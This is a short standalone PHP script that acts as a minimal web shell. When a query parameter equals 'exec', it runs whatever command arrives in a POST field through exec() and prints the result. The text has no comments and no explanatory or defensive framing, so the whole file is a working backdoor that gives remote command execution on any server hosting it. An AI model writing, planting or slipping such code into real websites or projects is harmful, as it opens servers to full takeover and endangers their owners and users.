<?php
$execfunc = $_GET['func'];

if ($execfunc=="exec") {
	$result = exec($_POST['command']);
	echo $result;
}

?>